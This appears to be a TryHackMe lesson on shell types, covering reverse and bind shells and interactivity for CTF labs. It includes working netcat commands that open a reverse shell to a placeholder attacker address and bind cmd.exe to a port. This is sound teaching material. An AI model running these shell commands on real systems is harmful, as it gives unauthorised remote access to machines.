# Shell Types

At a high level, we are interested in two kinds of shell when it comes to exploiting a target: **Reverse shells** and **Bind shells**.

## Reverse Shells

Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer, you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.

## Bind Shells

Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

As a general rule, reverse shells are easier to execute and debug. However, we will cover both examples below. Don't worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead, notice the difference between reverse and bind shells in the following simulations.

### Reverse Shell Example

Let's start with the more common reverse shell. Nine times out of ten, this is what you'll be going for -- especially in CTF challenges like those of TryHackMe.

Take a look at the following image. On the left, we have a reverse shell listener -- this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.

**On the attacking machine:**

```bash
sudo nc -lvnp 443
```

**On the target:**

```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

Notice that after running the command on the right, the listener receives a connection. When the `whoami` command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine and sending a connection from the target.

### Bind Shell Example

Bind shells are less common, but still very useful.

Once again, take a look at the following image. Again, on the left, we have the attacker's computer, on the right, we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute `cmd.exe`. Then, with the listener up and running, we connect from our own machine to the newly opened port.

**On the target:**

```bash
nc -lvnp <port> -e "cmd.exe"
```

**On the attacking machine:**

```bash
nc MACHINE_IP <port>
```

As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows. The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.

## Interactivity

The final concept which is relevant in this task is that of interactivity. Shells can be either interactive or non-interactive.

### Interactive Shells

If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:

Here you can see that it's asking interactively that the user type either `yes` or `no` in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.

### Non-Interactive Shells

Non-interactive shells don't give you that luxury. In a non-interactive shell, you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:

Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which is interactive) gives us no output at all. As an interesting side note, the output of an interactive command does go somewhere, however, figuring out where is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.

Additionally, in various places throughout this task, you will see a command in the screenshots called `listener`. This command is an alias unique to the attacking machine used for demonstrations and is a shorthand way of typing `sudo rlwrap nc -lvnp 443`, which will be covered in upcoming tasks. It will not work on any other machine unless the alias has been configured locally.